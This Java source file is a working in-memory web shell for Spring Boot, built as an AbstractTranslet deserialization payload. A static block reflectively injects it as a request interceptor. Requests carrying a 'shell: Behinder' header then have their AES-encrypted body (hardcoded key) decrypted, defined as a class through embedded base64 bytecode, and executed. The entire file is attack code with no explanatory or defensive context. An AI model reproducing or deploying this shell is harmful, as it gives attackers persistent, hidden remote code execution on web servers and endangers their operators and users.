import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class SpringbootInterceptorBehinderShell extends AbstractTranslet implements HandlerInterceptor {

    private final String pa = "2028ea0825d3605d";

    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) field.get(requestMappingHandlerMapping);
            SpringbootInterceptorBehinderShell memoryInterceptor = new SpringbootInterceptorBehinderShell("aaa");
            adaptedInterceptors.add(memoryInterceptor);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public SpringbootInterceptorBehinderShell(String test) {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String shell = request.getHeader("shell");
        if (shell.equals("Behinder")) {
            HttpSession session = request.getSession();
            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);
            ClassLoader loader = (ClassLoader) Thread.currentThread().getContextClassLoader();
            response.setStatus(HttpServletResponse.SC_OK);
            if (request.getMethod().equals("POST")) {
                if (loader.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else if (loader.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = loader.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, loader, session, request, pageContext);
                } else {
                    if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    } else if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    } else if (loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    } else {
                        Class Lclass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                        RushThere(Lclass, loader, session, request, pageContext);
                    }
                }
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }


    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext) {
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            java.lang.reflect.Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class); //获取g函数
            Um.setAccessible(true);
            String k = pa;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
